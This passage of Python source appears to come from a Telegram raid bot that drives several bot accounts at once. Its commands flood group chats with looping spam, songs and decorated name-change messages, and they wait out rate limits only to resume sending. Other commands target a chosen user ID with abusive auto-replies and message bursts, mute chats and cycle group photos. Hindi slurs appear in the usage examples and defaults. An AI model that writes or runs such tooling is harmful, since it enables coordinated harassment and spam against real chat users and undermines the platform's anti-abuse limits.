        f"  📊 𝘚𝘦𝘯𝘥𝘴: {best_s} | 𝘍𝘭𝘰𝘰𝘥𝘴: {best_f}",
        f"  💡 𝐀𝐩𝐩𝐥𝐲: -setdelay {best_d}",
        "╚══════════════════════════════════╝",
    ]
    await _reply(msg, "\n".join(lines))


@_guard
async def cmd_mute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    mute_chats.add(cid)
    for bot in _bots():
        try:
            await bot.set_chat_permissions(cid, ChatPermissions(can_send_messages=False))
        except Exception:
            pass
    await _reply(msg, "🔇 𝐂𝐇𝐀𝐓 𝐌𝐔𝐓𝐄𝐃")

@_guard
async def cmd_unmute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    mute_chats.discard(cid)
    for bot in _bots():
        try:
            await bot.set_chat_permissions(cid, ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
            ))
        except Exception:
            pass
    await _reply(msg, "🔊 𝐂𝐇𝐀𝐓 𝐔𝐍𝐌𝐔𝐓𝐄𝐃")

@_guard
async def cmd_spam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -spam <text>")
        return

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(cid, txt)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "spam", _run)
    await _reply(msg, "💬 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 — -stopspam to stop")

@_guard
async def cmd_stopspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "spam")
    await _reply(msg, "⛔ 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_slidespam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -slidespam <text>")
        return

    SLIDE_MSGS = [
        f"💥𒐫𒐫𒐫{txt}𒐫𒐫𒐫💥 ➴ྀ࿐",
        f"🔥 {txt} 🔥 ➴ྀ࿐ ··",
        f"⚡{txt}⚡𒐫𒐫💥💥 ➴ྀ࿐",
        f"💀 {txt} 💀 𒐫💥𒐫 ·· ➴ྀ",
        f"👑{txt}👑 𒐫𒐫💥𒐫𒐫 ➴ྀ",
    ]
    idx = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(cid, SLIDE_MSGS[idx[0] % len(SLIDE_MSGS)])
                    idx[0] += 1
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "slide", _run)
    await _reply(msg,
        f"💥 𝐒𝐋𝐈𝐃𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stopslide to stop"
    )

@_guard
async def cmd_stopslide(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "slide")
    await _reply(msg, "⛔ 𝐒𝐋𝐈𝐃𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_autoreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -autoreply <text>")
        return
    autoreply_chats[cid] = txt
    await _reply(msg, f"✅ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐩𝐥𝐲 𝐬𝐞𝐭: {txt}")

@_guard
async def cmd_stopreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    autoreply_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐩𝐥𝐲 𝐨𝐟𝐟")

@_guard
async def cmd_react(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid   = msg.chat_id
    args  = _get_args(ctx)
    emoji = args[0] if args else "🔥"
    autoreact_chats[cid] = emoji
    await _reply(msg, f"✅ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐚𝐜𝐭: {emoji}")

@_guard
async def cmd_stopreact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    autoreact_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐀𝐮𝐭𝐨 𝐫𝐞𝐚𝐜𝐭 𝐨𝐟𝐟")

@_guard
async def cmd_targetreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄𝐏𝐋𝐘\n"
            "  𝘜𝘴𝘦: -targetreply <uid> <text>\n"
            "  𝘌𝘨: -targetreply 123456 BC chodu\n"
            "  𝘉𝘰𝘵 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘵𝘰 𝘦𝘷𝘦𝘳𝘺 𝘮𝘴𝘨\n"
            "  𝘧𝘳𝘰𝘮 𝘵𝘢𝘳𝘨𝘦𝘵 𝘶𝘴𝘦𝘳\n"
            "╚══════════════════════════════╝"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃. 𝘜𝘴𝘦 𝘯𝘶𝘮𝘦𝘳𝘪𝘤 𝘐𝘋.")
        return
    txt = " ".join(args[1:]).strip()
    targetreply_chats[cid] = {"uid": uid, "text": txt}
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄𝐏𝐋𝐘 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        f"  👤 𝘜𝘴𝘦𝘳 𝘐𝘋: {uid}\n"
        f"  💬 𝘙𝘦𝘱𝘭𝘺: {txt}\n"
        f"  𝘌𝘷𝘦𝘳𝘺 𝘮𝘴𝘨 𝘧𝘳𝘰𝘮 𝘵𝘢𝘳𝘨𝘦𝘵 = 𝘳𝘦𝘱𝘭𝘺\n"
        f"  -stoptargetreply 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stoptargetreply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    targetreply_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐑𝐄𝐏𝐋𝐘 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_targetslide(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if not args:
        await _reply(msg,
            "╔══════════════════════════════╗\n"
            "  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐋𝐈𝐃𝐄\n"
            "  𝘜𝘴𝘦: -targetslide <uid>\n"
            "  𝘞𝘩𝘦𝘯 𝘵𝘢𝘳𝘨𝘦𝘵 𝘴𝘦𝘯𝘥𝘴 𝘢 𝘮𝘴𝘨,\n"
            "  𝘣𝘰𝘵 𝘧𝘪𝘳𝘦𝘴 𝘴𝘭𝘪𝘥𝘦 𝘣𝘶𝘳𝘴𝘵 𝘰𝘯 𝘵𝘩𝘦𝘮\n"
            "╚══════════════════════════════╝"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃.")
        return
    txt = " ".join(args[1:]).strip() or "💥𒐫𒐫𒐫CHUD𒐫𒐫💥 ➴ྀ"
    targetslide_chats[cid] = {"uid": uid, "text": txt}
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🎯 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐋𝐈𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        f"  👤 𝘜𝘴𝘦𝘳 𝘐𝘋: {uid}\n"
        f"  💬 𝘚𝘭𝘪𝘥𝘦 ??𝘦𝘹𝘵: {txt}\n"
        f"  𝘛𝘢𝘳𝘨𝘦𝘵 𝘮𝘴𝘨 → 𝘣𝘶𝘳𝘴𝘵 𝘴𝘭𝘪𝘥𝘦𝘴\n"
        f"  -stoptargetslide 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_stoptargetslide(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    targetslide_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐋𝐈𝐃𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

async def _fire_slide_burst(chat_id: int, text: str, reply_to_msg=None):
    bots  = _bots()
    burst = min(len(bots) * 2, 10)
    SLIDE_VARIANTS = [
        f"💥𒐫𒐫{text}𒐫𒐫💥 ➴ྀ",
        f"🔥 {text} 🔥 ➴ྀ ··",
        f"⚡{text}⚡𒐫💥 ·· ➴ྀ",
        f"💀 {text} 💀 𒐫💥𒐫 ➴ྀ",
        f"👑{text}👑 𒐫𒐫💥𒐫 ➴ྀ",
        f"[chud {text}𒐫💥{random.choice(_CHUD_WORDS)} ➴ྀ]",
    ]

    async def _send(bot, variant):
        try:
            if reply_to_msg:
                await reply_to_msg.reply_text(variant)
            else:
                await bot.send_message(chat_id, variant)
        except Exception:
            pass

    tasks = []
    for i in range(burst):
        bot = bots[i % len(bots)]
        tasks.append(asyncio.create_task(_send(bot, SLIDE_VARIANTS[i % len(SLIDE_VARIANTS)])))
    await asyncio.gather(*tasks, return_exceptions=True)

@_guard
async def cmd_addpfp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    if not (rep and rep.photo):
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰 𝘵𝘰 𝘢𝘥𝘥 𝘵𝘰 𝘗𝘍𝘗 𝘱𝘰𝘰𝘭")
        return
    fid  = rep.photo[-1].file_id
    key  = str(cid)
    pool = _pfp_pools.get(key, [])
    if fid not in pool:
        pool.append(fid)
        _pfp_pools[key] = pool
        _save_json(PFP_FILE, _pfp_pools)
    await _reply(msg,
        f"✅ 𝐏𝐅𝐏 𝐀𝐃𝐃𝐄𝐃\n"
        f"📋 𝘗𝘰𝘰𝘭 𝘴𝘪𝘻𝘦: {len(pool)}"
    )

@_guard
async def cmd_pfppool(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    pool = _pfp_pools.get(str(cid), [])
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  🖼️ 𝐏𝐅𝐏 𝐏𝐎𝐎𝐋\n"
        f"  𝘗𝘩𝘰𝘵𝘰𝘴: {len(pool)}\n"
        f"  -pfploop <sec> 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_clearpfp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    _pfp_pools.pop(str(cid), None)
    _save_json(PFP_FILE, _pfp_pools)
    await _reply(msg, "✅ 𝐏𝐅𝐏 𝐏𝐎𝐎𝐋 𝐂𝐋𝐄𝐀𝐑𝐄𝐃")

@_guard
async def cmd_pfploop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    pool = _pfp_pools.get(str(cid), [])
    if not pool:
        await _reply(msg,
            "⚠️ 𝐍𝐨 𝐏𝐅𝐏𝐬 𝐢𝐧 𝐩𝐨𝐨𝐥!\n"
            "𝘙𝘦𝘱𝘭𝘺 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰 𝘸𝘪𝘵𝘩 -addpfp 𝘧𝘪𝘳𝘴𝘵"
        )
        return
    try:
        delay = float(args[0]) if args else 3.0
        if delay < 1.0:
            delay = 1.0
    except ValueError:
        delay = 3.0

    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return

    pfploop_active[cid] = True

    async def _run(stop_ev):
        idx = 0
        try:
            while not stop_ev.is_set():
                fid = pool[idx % len(pool)]
                idx += 1
                for bot in bots:
                    if stop_ev.is_set():
                        break
                    try:
                        await bot.set_chat_photo(cid, fid)
                        break
                    except RetryAfter as e:
                        await asyncio.sleep(min(e.retry_after, 3.0))
                    except (BadRequest, Forbidden):
                        break
                    except (TimedOut, NetworkError):
                        await asyncio.sleep(0.5)
                    except Exception:
                        break
                if await _wait_ev(stop_ev, delay):
                    break
        finally:
            pfploop_active.pop(cid, None)

    await tc.start(cid, "pfp", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🖼️ 𝐏𝐅𝐏 𝐋𝐎𝐎𝐏 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📋 𝘗𝘩𝘰𝘵𝘰𝘴: {len(pool)}\n"
        f"  ⏱  𝘋𝘦𝘭𝘢𝘺: {delay}𝘴 𝘱𝘦𝘳 𝘤𝘺𝘤𝘭𝘦\n"
        f"  -stoppfploop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

# ═══════════════════════════════════════════
#  CUSTOM NC TEMPLATE SYSTEM
# ═══════════════════════════════════════════

@_guard
async def cmd_addtemplate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "╔══════════════════════════════════╗\n"
            "  📝 𝐀𝐃𝐃𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄\n"
            "  ──────────────────────────────────\n"
            "  𝐔𝐬𝐞: -addtemplate <name> <template>\n"
            "  ──────────────────────────────────\n"
            "  𝗣𝗹𝗮𝗰𝗲𝗵𝗼𝗹𝗱𝗲𝗿𝘀:\n"
            "  {t}   → NC text (tum jo doge)\n"
            "  {w}   → chud word (LUND/TBKC...)\n"
            "  {e}   → random emoji\n"
            "  {n}   → counter (1,2,3...)\n"
            "  {wl}  → left wrap (꧁ ♛ 🔱...)\n"
            "  {wr}  → right wrap (꧂ ♛ 🌊...)\n"
            "  ──────────────────────────────────\n"
            "  𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀:\n"
            "  -addtemplate fire 🔥{wl}{t}{wr}🔥{w}\n"
            "  -addtemplate king 👑{t}👑 {w} {e}\n"
            "  -addtemplate og [{t}𒐫💥{w}➴ྀ{n}]\n"
            "╚══════════════════════════════════╝"
        )
        return
    name     = args[0].lower().strip()
    template = " ".join(args[1:]).strip()
    if len(name) > 30:
        await _reply(msg, "⚠️ 𝐍𝐚𝐦𝐞 𝐭𝐨𝐨 𝐥𝐨𝐧𝐠 (𝐦𝐚𝐱 30 𝐜𝐡𝐚𝐫𝐬)")
        return
    if len(template) > 220:
        await _reply(msg, "⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 𝐭𝐨𝐨 𝐥𝐨𝐧𝐠 (𝐦𝐚𝐱 220 𝐜𝐡𝐚𝐫𝐬)")
        return
    is_update = name in custom_templates
    custom_templates[name] = template
    _save_templates()
    action = "𝐔𝐩𝐝𝐚𝐭𝐞𝐝" if is_update else "𝐒𝐚𝐯𝐞𝐝"
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  ✅ 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄 {action}!\n"
        f"  📛 𝐍𝐚𝐦𝐞:     {name}\n"
        f"  📝 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞: {template[:50]}{'...' if len(template)>50 else ''}\n"
        f"  💡 𝐔𝐬𝐞: -customnc {name} <yourtext>\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_templates(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    if not custom_templates:
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  📂 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄𝐒\n"
            "  𝘕𝘰 𝘵𝘦𝘮𝘱𝘭𝘢𝘵𝘦𝘴 𝘴𝘢𝘷𝘦𝘥 𝘺𝘦𝘵\n"
            "  𝐔𝐬𝐞 -addtemplate 𝘵𝘰 𝘢𝘥𝘥\n"
            "╚══════════════════════════╝"
        )
        return
    lines = [
        "╔══════════════════════════════╗",
        "  📂 𝐒𝐀𝐕𝐄𝐃 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄𝐒",
        "  ─────────────────────────────",
    ]
    for i, (name, tmpl) in enumerate(custom_templates.items(), 1):
        preview = tmpl[:35] + ("..." if len(tmpl) > 35 else "")
        lines.append(f"  {i}. 📛 {name}")
        lines.append(f"     📝 {preview}")
    lines.append("  ─────────────────────────────")
    lines.append(f"  𝘛𝘰𝘵𝘢𝘭: {len(custom_templates)} 𝘵𝘦𝘮𝘱𝘭𝘢𝘵𝘦𝘴")
    lines.append("  💡 -customnc <name> <text>")
    lines.append("╚══════════════════════════════╝")
    await _reply(msg, "\n".join(lines))

@_guard
async def cmd_deltemplate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -deltemplate <name>")
        return
    name = args[0].lower().strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟??𝐮𝐧𝐝\n"
            f"𝐔𝐬𝐞 -templates 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭"
        )
        return
    del custom_templates[name]
    _save_templates()
    await _reply(msg, f"🗑️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐝𝐞𝐥𝐞𝐭𝐞𝐝")

@_guard
async def cmd_templateinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -templateinfo <name>")
        return
    name = args[0].lower().strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝\n"
            f"𝐔𝐬𝐞 -templates 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭"
        )
        return
    tmpl   = custom_templates[name]
    sample = _custom_template_factory(tmpl, "TEST")()
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  📝 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄 𝐈𝐍𝐅𝐎\n"
        f"  ─────────────────────────────\n"
        f"  📛 𝐍𝐚𝐦𝐞:    {name}\n"
        f"  📝 𝐑𝐚𝐰:     {tmpl}\n"
        f"  👁️ 𝐏𝐫𝐞𝐯𝐢𝐞𝐰: {sample}\n"
        f"  💡 𝐔𝐬𝐞: -customnc {name} <text>\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_customnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        saved = ", ".join(custom_templates.keys()) if custom_templates else "none"
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  ⚡ 𝐂𝐔𝐒𝐓𝐎𝐌𝐍𝐂\n"
            f"  𝐔𝐬𝐞: -customnc <name> <text>\n"
            f"  ─────────────────────────────\n"
            f"  📂 𝐒𝐚𝐯𝐞𝐝: {saved}\n"
            f"  📝 𝐀𝐝𝐝 𝐧𝐞𝐰: -addtemplate\n"
            f"╚══════════════════════════════╝"
        )
        return
    name = args[0].lower().strip()
    txt  = " ".join(args[1:]).strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝\n"
            f"𝐔𝐬𝐞 -templates 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭"
        )
        return
    tmpl    = custom_templates[name]
    factory = _custom_template_factory(tmpl, txt)
    preview = factory()
    await _start_nc(msg, cid, factory, f"🎨 {name}: {txt}", engine_name="CUSTOM")

@_guard
async def cmd_previewtemplate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg, "𝐔𝐬𝐞: -preview <name> <text>\n𝘚𝘦𝘦 𝘩𝘰𝘸 𝘵𝘦𝘮𝘱𝘭𝘢𝘵𝘦 𝘭𝘰𝘰𝘬𝘴")
        return
    name = args[0].lower().strip()
    txt  = " ".join(args[1:]).strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝"
        )
        return
    tmpl = custom_templates[name]
    f    = _custom_template_factory(tmpl, txt)
    samples = [f() for _ in range(4)]
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  👁️ 𝐏𝐑𝐄𝐕𝐈𝐄𝐖: {name}\n"
        f"  𝘵𝘦𝘹𝘵 = '{txt}'\n"
        f"  ─────────────────────────────\n" +
        "\n".join(f"  {i+1}. {s}" for i, s in enumerate(samples)) + "\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_cleartemplates(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    count = len(custom_templates)
    custom_templates.clear()
    _save_templates()
    await _reply(msg, f"🗑️ 𝐀𝐥𝐥 {count} 𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝")


@_guard
async def cmd_stoppfploop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    pfploop_active.pop(cid, None)
    await tc.stop(cid, "pfp")
    await _reply(msg, "⛔ 𝐏𝐅𝐏 𝐋𝐎𝐎𝐏 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


# ═══════════════════════════════════════════
#  🎵 SONG COMMAND
# ═══════════════════════════════════════════

@_guard
async def cmd_addsong(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Reply to an audio/voice file with -addsong <name> to save it to the library."""
    msg = update.message or update.edited_message
    if not msg:
        return
    rep  = msg.reply_to_message
    args = _get_args(ctx)
    name = " ".join(args).strip().lower() if args else ""
    if not rep or not name:
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  🎵 𝐀𝐃𝐃𝐒𝐎𝐍𝐆 — 𝐇𝐨𝐰 𝐭𝐨 𝐮𝐬𝐞\n"
            "  𝟏. 𝘚𝘦𝘯𝘥 𝘢𝘯 𝘢𝘶𝘥𝘪𝘰 𝘧𝘪𝘭𝘦\n"
            "  𝟐. 𝘙𝘦𝘱𝘭𝘺 𝘵𝘰 𝘪𝘵 𝘸𝘪𝘵𝘩:\n"
            "     -addsong <name>\n"
            "  𝟑. 𝘜𝘴𝘦 -song <name> 𝘵𝘰 𝘱𝘭𝘢𝘺\n"
            "╚══════════════════════════╝"
        )
        return
    if rep.audio:
        fid   = rep.audio.file_id
        title = rep.audio.title or rep.audio.file_name or name
        dur   = rep.audio.duration or 0
        kind  = "audio"
    elif rep.voice:
        fid   = rep.voice.file_id
        title = name
        dur   = rep.voice.duration or 0
        kind  = "voice"
    elif rep.document and rep.document.mime_type and rep.document.mime_type.startswith("audio"):
        fid   = rep.document.file_id
        title = rep.document.file_name or name
        dur   = 0
        kind  = "document"
    else:
        await _reply(msg, "⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚𝐧 𝐚𝐮𝐝𝐢𝐨 𝐟𝐢𝐥𝐞 𝐨𝐫 𝐯𝐨𝐢𝐜𝐞 𝐧𝐨𝐭𝐞!")
        return
    if "lib" not in _song_data:
        _song_data["lib"] = {}
    _song_data["lib"][name] = {"file_id": fid, "title": title, "dur": dur, "kind": kind}
    _song_data["last"] = name
    _save_json(SONG_FILE, _song_data)
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  ✅ 𝐒𝐎𝐍𝐆 𝐒𝐀𝐕𝐄𝐃\n"
        f"  🏷️  𝘕𝘢𝘮𝘦: {name}\n"
        f"  🎵 𝘛𝘪𝘵𝘭𝘦: {title}\n"
        f"  ⏱️  𝘋𝘶𝘳: {dur}𝘴\n"
        f"  📦 𝘛𝘺𝘱𝘦: {kind}\n"
        f"  𝘜𝘴𝘦: -song {name}\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_song(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Send a named song (or the last saved one) once to current GC.  Usage: -song [name]"""
    msg = update.message or update.edited_message
    if not msg:
        return
    lib  = _song_data.get("lib", {})
    args = _get_args(ctx)
    name = " ".join(args).strip().lower() if args else ""
    if name:
        # Explicit name — must exist in library
        if name not in lib:
            keys = ", ".join(lib.keys()) if lib else "none"
            await _reply(msg, f"⚠️ 𝐒𝐨𝐧𝐠 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {keys}")
            return
        entry = lib[name]
    else:
        # No name — use last saved, then first available
        if not lib:
            await _reply(msg,
                "⚠️ 𝐍𝐨 𝐬𝐨𝐧𝐠𝐬 𝐬𝐚𝐯𝐞𝐝!\n"
                "𝐔𝐬𝐞: -addsong <name>  (𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚𝐮𝐝𝐢𝐨)"
            )
            return
        last = _song_data.get("last", "")
        name  = last if last in lib else next(iter(lib))
        entry = lib[name]
    fid   = entry["file_id"]
    title = entry.get("title", name)
    kind  = entry.get("kind", "audio")
    cid   = msg.chat_id
    bots  = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    ok = 0
    for bot in bots:
        try:
            if kind == "voice":
                await bot.send_voice(cid, fid)
            elif kind == "document":
                await bot.send_document(cid, fid)
            else:
                await bot.send_audio(cid, fid)
            ok += 1
            break
        except Exception:
            for send in [bot.send_audio, bot.send_voice, bot.send_document]:
                try:
                    await send(cid, fid)
                    ok += 1
                    break
                except Exception:
                    pass
            if ok:
                break
    if ok:
        await _reply(msg, f"🎵 𝐒𝐨𝐧𝐠 𝐬𝐞𝐧𝐭: {title}")
    else:
        await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐬𝐨𝐧𝐠 — 𝐛𝐨𝐭 𝐦𝐚?? 𝐧𝐞𝐞𝐝 𝐚𝐝𝐦𝐢𝐧")

@_guard
async def cmd_songspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Continuously send a named song (or last saved) to current GC in a loop.  Usage: -songspam [name]"""
    msg = update.message or update.edited_message
    if not msg:
        return
    lib  = _song_data.get("lib", {})
    args = _get_args(ctx)
    name = " ".join(args).strip().lower() if args else ""
    if name:
        if name not in lib:
            keys = ", ".join(lib.keys()) if lib else "none"
            await _reply(msg, f"⚠️ 𝐒𝐨𝐧𝐠 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {keys}")
            return
        entry = lib[name]
    else:
        if not lib:
